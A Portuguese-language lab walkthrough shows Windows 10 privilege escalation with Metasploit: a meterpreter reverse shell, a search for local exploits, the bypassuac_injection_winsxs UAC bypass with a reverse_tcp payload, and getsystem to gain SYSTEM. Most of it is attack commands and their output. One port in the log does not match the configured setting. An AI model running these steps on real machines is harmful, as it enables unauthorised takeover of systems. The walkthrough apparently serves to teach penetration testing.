## Escalando Privilégio

Não existe uma 'receita' definitiva, srá necessário testar  vários scripts até obter sucesso.

Nesta fase, supõe-se que já temos acesso a máquina alvo através do meterpreter. Neste exemplo na porta 4444.

```
$ msfconsole
Metasploit tip: Enable HTTP request and response logging with set HttpTrace 
true

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.1.10
LHOST => 192.168.1.10

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] Sending stage (203846 bytes) to 192.168.1.38
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.38:49765) at 2025-09-04 09:59:18 -0300

meterpreter > 
```
## Pesquisa do exploit

Neste momento, temos acesso a uma conta de usuério
```
meterpreter > getuid
Server username: WIN10\user

meterpreter > sysinfo
Computer        : WIN10
OS              : Windows 10 22H2+ (10.0 Build 19045).
Architecture    : x64
System Language : pt_BR
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```
O objetivo é escalar para uma conta com privilégios de sistema.

O primeiro passo é colocar a sessão do meterpreter em 'espera', e retonar ao prompt do metasploit.
```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > show sessions

Active sessions
===============

  Id  Name  Type                     Information         Connection
  --  ----  ----                     -----------         ----------
  1         meterpreter x64/windows  WIN10\user @ WIN10  192.168.1.10:4444 -> 192.168.1.38:49765
                                                          (192.168.1.38)

msf6 exploit(multi/handler) > 
```
E procurar por exploits que escale privilégios. Exemplos:

* A build é de outubro de 2022, pode-se procurar exploits desse ano.
  ```
  msf6 exploit(multi/handler) > search 2022
  ``` 
  Alguns exploits candidatos:
  | # | Name | Rank | Check | Description |
  |---|------|------|-------|-------------|
  | 47 |  exploit/windows/local/cve_2022_21999_spoolfool_privesc 2022-02-08 | normal |   Yes |   CVE-2022-21999 SpoolFool Privesc |
  |233 | exploit/windows/local/cve_2022_26904_superprofile 2022-03-17 | excellent |      Yes | User Profile Arbitrary Junction Creation Local Privilege Elevation |

  *observe 'windows/local'*
* Procure por 'bypassuac'.
  ```
  msf6 exploit(multi/handler) > search bypassuac
  ```
  Alguns exploits candidatos:
  | # | Name | Rank | Check | Description |
  |---|------|------|-------|-------------|
  | 2 | exploit/windows/local/bypassuac 2010-12-31 |excellent | No | Windows Escalate UAC Protection Bypass|
  |5   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
  |8   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
  | 11  exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
   12  exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   13  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   14    \_ target: Windows x86                               .                .          .      .
   15    \_ target: Windows x64                               .                .          .      .
   16  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   17  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   18  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   19  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   20    \_ target: Windows x86                               .                .          .      .
   21    \_ target: Windows x64
   22  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)

## Seleção do Exploit

Após vária tentativas, o exploit que funcionou foi o **bypassuac_injection_winsxs**
```
msf6 > use exploit/windows/local/bypassuac_injection_winsxs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
> Description:
> Description:
>  This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off by abusing the way "WinSxS" works in Windows systems. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three seperate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also).

Configurando a arquitetura.
```
set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
```
msf6 exploit(windows/local/bypassuac_injection_winsxs) > set target 1
target => 1
```
Informando a sessão do meterpreter aberta
```
msf6 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 1
SESSION => 1
```
Informando a máquina de ataque (origem do ataque).
```
msf6 exploit(windows/local/bypassuac_injection_winsxs) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
```
É preciso alterar a porta, uma vez que já temos uma outra sessão na porta 4444.
```
msf6 exploit(windows/local/bypassuac_injection_winsxs) > set LPORT 5555
LPORT => 5555
```
Verificando as configurações:
```
msf6 exploit(windows/local/bypassuac_injection_winsxs) > show options

Module options (exploit/windows/local/bypassuac_injection_winsxs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64
```
Estamos prontos para a execução do exploit.

## Execução
```
msf6 exploit(windows/local/bypassuac_injection_winsxs) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[+] Windows 10 version 22H2 may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Creating temporary folders...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 4872
[*] Sending stage (203846 bytes) to 192.168.1.38
[+] All the dropped elements have been successfully removed
[*] Meterpreter session 2 opened (192.168.1.10:4444 -> 192.168.1.38:50574) at 2025-09-04 10:54:17 -0300

meterpreter > getuid
Server username: WIN10\user
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
Ataque feito com sucesso, máquina alvo windows 10 22H2 invadida com privilégio de sistema.
